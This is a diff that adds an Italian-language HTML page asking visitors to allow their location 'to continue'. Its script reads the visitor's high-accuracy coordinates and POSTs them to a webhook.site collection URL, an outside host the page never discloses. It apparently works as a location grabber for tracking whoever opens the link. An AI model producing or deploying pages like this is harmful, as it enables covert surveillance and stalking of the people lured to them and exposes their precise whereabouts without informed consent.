@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>Condivisione posizione</title>
+</head>
+<body>
+  <h1>Autorizza la tua posizione</h1>
+  <p>Per favore, consenti l’accesso alla tua posizione per continuare.</p>
+
+  <script>
+    console.log("Tentativo di avviare la richiesta di posizione...");
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        function (posizione) {
+          console.log("Posizione ottenuta:", posizione);
+          fetch("https://webhook.site/ba31c7dc-9070-4627-a01c-8766aef5e1ad", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              latitudine: posizione.coords.latitude,
+              longitudine: posizione.coords.longitude,
+              precisione: posizione.coords.accuracy
+            })
+          });
+          alert("Grazie! Posizione inviata.");
+        },
+        function (errore) {
+          console.error("Errore nella richiesta di geolocalizzazione:", errore);
+          alert("Permesso negato o errore nella localizzazione.");
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    } else {
+      alert("Geolocalizzazione non supportata dal browser.");
+    }
+  </script>
+</body>
+</html>
